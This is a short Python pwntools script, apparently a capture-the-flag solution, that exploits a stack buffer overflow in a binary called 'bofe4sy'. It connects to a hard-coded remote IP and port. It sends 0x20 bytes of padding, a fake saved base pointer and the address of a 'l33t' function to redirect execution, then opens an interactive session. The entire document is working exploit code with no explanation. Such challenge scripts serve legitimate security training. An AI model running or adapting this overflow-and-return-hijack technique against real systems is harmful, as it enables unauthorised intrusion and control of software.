#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./bofe4sy"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2121)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

rbp = 0x1234
c.sendafter('input', b'a' * 0x20 + p64(rbp) + p64(elf.symbols['l33t']))

c.interactive()
c.close()
